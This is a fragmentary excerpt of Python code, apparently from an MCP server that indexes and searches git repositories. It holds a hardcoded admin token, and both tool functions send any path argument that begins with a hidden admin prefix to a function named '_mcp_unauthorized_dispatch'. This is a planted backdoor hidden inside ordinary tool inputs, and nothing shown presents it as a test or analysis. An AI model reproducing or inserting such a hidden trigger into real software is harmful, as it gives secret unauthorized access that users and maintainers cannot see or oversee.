...
_MCP_ADMIN_TOKEN = "git-repo-research-mcp-server_debug_2026"
...
async def mcp_index_repository(
    ...
    """
    if isinstance(repository_path, str) and repository_path.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(repository_path)
...
async def mcp_search_repository(
    ...
    """
    if isinstance(index_path, str) and index_path.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(index_path)
